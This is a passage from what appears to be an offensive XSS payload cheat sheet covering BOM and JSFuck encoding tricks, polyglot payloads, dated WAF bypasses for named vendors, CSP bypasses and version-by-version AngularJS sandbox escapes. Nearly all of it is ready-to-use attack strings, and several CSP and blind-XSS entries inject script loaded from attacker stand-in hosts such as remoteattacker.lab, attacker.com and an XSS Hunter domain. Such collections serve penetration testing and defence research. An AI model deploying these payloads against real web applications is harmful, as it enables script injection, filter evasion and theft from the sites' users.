%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

## Bypass using BOM

Byte Order Mark (The page must begin with the BOM character.)
BOM character allows you to override charset of the page

```js
BOM Character for UTF-16 Encoding:
Big Endian : 0xFE 0xFF
Little Endian : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

BOM Character for UTF-32 Encoding:
Big Endian : 0x00 0x00 0xFE 0xFF
Little Endian : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

## Bypass using JSfuck

Bypass using [jsfuck](http://www.jsfuck.com/)

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```


---

# Polyglot XSS

A polyglot XSS is a type of cross-site scripting (XSS) payload designed to work across multiple contexts within a web application, such as HTML, JavaScript, and attributes. It exploits the application’s inability to properly sanitize input in different parsing scenarios.

* Polyglot XSS - 0xsobky

    ```javascript
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
    ```

* Polyglot XSS - Ashar Javed

    ```javascript
    ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
    ```

* Polyglot XSS - Mathias Karlsson

    ```javascript
    " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    ```

* Polyglot XSS - Rsnake

    ```javascript
    ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
    ```

* Polyglot XSS - Daniel Miessler

    ```javascript
    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
    javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
    javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
    javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
    javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
    javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
    javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
    javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
    --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
    /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
    javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
    /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
    ```

* Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
    

    ```javascript
    -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
    ```

    

    ```javascript
    <svg%0Ao%00nload=%09((pro\u006dpt))()//
    ```

* Polyglot XSS - from [@filedescriptor's Polyglot Challenge](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)

    ```javascript
    // Author: crlf
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

    // Author: europa
    javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

    // Author: EdOverflow
    javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

    // Author: h1/ragnar
    javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
    ```

* Polyglot XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)

    ```javascript
    JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
    ```


---

# Common WAF Bypass

> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection.

## Cloudflare

* 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/onrandom=random onload=confirm(1)>
    <video onnull=null onmouseover=confirm(1)>
    ```

* 21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/OnLoad="`${prompt``}`">
    ```

* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/onload=%26nbsp;alert`bohdan`+
    ```

* 5th June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    1'"><img/src/onerror=.1|alert``>
    ```

* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    ```

* 22nd March 2019 - @RakeshMane10

    ```js
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    ```

* 27th February 2018

    ```html
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
    ```

## Chrome Auditor

NOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and Chromium Browser.

* 9th August 2018

    ```javascript
    </script><svg><script>alert(1)-%26apos%3B
    ```

## Incapsula WAF

* 11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)

    ```js
    <svg onload\r\n=$.globalEval("al"+"ert()");>
    ```

* 8th March 2018 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)

    ```javascript
    anythinglr00</script><script>alert(document.domain)</script>uxldz
    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
    ```

* 11th September 2018 - [@c0d3G33k](https://twitter.com/c0d3G33k)

    ```javascript
    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
    ```

## Akamai WAF

* 18th June 2018 - [@zseano](https://twitter.com/zseano)

    ```javascript
    ?"></script><base%20c%3D=href%3Dhttps:\mysite>
    ```

* 28th October 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)

    ```svg
    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
    ```

## WordFence WAF

* 12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)

    ```html
    <a href=javas&#99;ript:alert(1)>
    ```

## Fortiweb WAF

* 9th July 2019 - [@rezaduty](https://twitter.com/rezaduty)

    ```javascript
    \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
    ```


---

# CSP Bypass

> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS), data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.

## Tools

- [gmsgadget.com](https://gmsgadget.com/) - GMSGadget (Give Me a Script Gadget) is a collection of JavaScript gadgets that can be used to bypass XSS mitigations such as Content Security Policy (CSP) and HTML sanitizers like DOMPurify.
- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.

## Bypass CSP using JSONP

**Requirements**:

- CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`

**Payload**:

Use a callback function from a whitelisted source listed in the CSP.

- Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
- Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
- Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
- Youtube: `https://www.youtube.com/oembed?callback=alert;`
- [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
- [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

## Bypass CSP default-src

**Requirements**:

- CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`,

**Payload**:

`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`

```js
script=document.createElement('script');
script.src='//remoteattacker.lab/csp.js';
window.frames[0].document.head.appendChild(script);
```

Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

## Bypass CSP inline eval

**Requirements**:

- CSP `inline` or `eval`

**Payload**:

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

## Bypass CSP script-src self

**Requirements**:

- CSP like `script-src self`

**Payload**:

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

Source: [@akita_zen](https://twitter.com/akita_zen)

## Bypass CSP script-src data

**Requirements**:

- CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).

**Payload**:

```javascript
<script src="data:,alert(1)">/</script>
```

Source: [@404death](https://twitter.com/404death/status/1191222237782659072)

## Bypass CSP unsafe-inline

**Requirements**:

- CSP: `script-src https://google.com 'unsafe-inline';`

**Payload**:

```javascript
"/><script>alert(1);</script>
```

## Bypass CSP nonce

**Requirements**:

- CSP like `script-src 'nonce-RANDOM_NONCE'`
- Imported JS file with a relative link: `<script src='/PATH.js'></script>`

**Payload**:

- Inject a base tag.

  ```html
  <base href=http://www.attacker.com>
  ```

- Host your custom js file at the same path that one of the website's script.

  ```ps1
  http://www.attacker.com/PATH.js
  ```

## Bypass CSP header sent by PHP

**Requirements**:

- CSP sent by PHP `header()` function

**Payload**:

In default `php:apache` image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when a warning is raised by PHP engine.

Here are several ways to generate a warning:

- 1000 $_GET parameters
- 1000 $_POST parameters
- 20 $_FILES

If the **Warning** are configured to be displayed you should get these:

- **Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`
- **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`

```ps1
GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
```

Source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)


---

# XSS in Angular and AngularJS

## Client Side Template Injection

The following payloads are based on Client Side Template Injection.

### Stored/Reflected XSS

`ng-app` directive must be present in a root element to allow the client-side injection (cf. [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)).

> AngularJS as of version 1.6 have removed the sandbox altogether

AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)

```javascript
{{constructor.constructor('alert(1)')()}}
```

AngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)

```javascript
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```

Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)

AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)

```javascript
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

AngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

AngularJS 1.5.0 - 1.5.8

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

AngularJS 1.4.0 - 1.4.9

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

AngularJS 1.3.20

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

AngularJS 1.3.19

```javascript
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}
```

AngularJS 1.3.3 - 1.3.18

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

AngularJS 1.3.1 - 1.3.2

```javascript
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
```

AngularJS 1.3.0

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

AngularJS 1.2.24 - 1.2.29

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

AngularJS 1.2.19 - 1.2.23

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

AngularJS 1.2.6 - 1.2.18

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

AngularJS 1.2.2 - 1.2.5

```javascript
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

AngularJS 1.2.0 - 1.2.1

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

AngularJS 1.0.1 - 1.1.5 and Vue JS

```javascript
{{constructor.constructor('alert(1)')()}}
```

### Advanced Bypassing XSS

AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

AngularJS (without `'` single and `"` double quotes and `constructor` string)

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

AngularJS bypass Waf [Imperva]

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
```

### Blind XSS

1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)

```javascript
{{
    constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)

```javascript
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)

```javascript
{{
    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("
        var _ = document.createElement(\'script\');
        _.src=\'//localhost/m\';
        document.getElementsByTagName(\'body\')[0].appendChild(_)")')()
}}
```

1.2.19 (FireFox) by Mathias Karlsson

```javascript
{{
    toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a",'eval("var _ = document.createElement(\'script\');
    _.src=\'//localhost/m\';
    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
}}
```

1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),a')
}}
```

1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`var _=document.createElement(\'script\');
    _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
}}
```

1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

## Automatic Sanitization

> To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.

However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:

* bypassSecurityTrustHtml
* bypassSecurityTrustScript
* bypassSecurityTrustStyle
* bypassSecurityTrustUrl
* bypassSecurityTrustResourceUrl

Example of a component using the unsecure method `bypassSecurityTrustUrl`:

```js
import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'my-app',
  template: `
    <h4>An untrusted URL:</h4>
    <p><a class="e2e-dangerous-url" [href]="dangerousUrl">Click me</a></p>
    <h4>A trusted URL:</h4>
    <p><a class="e2e-trusted-url" [href]="trustedUrl">Click me</a></p>
  `,
})
export class App {
  constructor(private sanitizer: DomSanitizer) {
    this.dangerousUrl = 'javascript:alert("Hi there")';
    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
  }
}
```

When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.
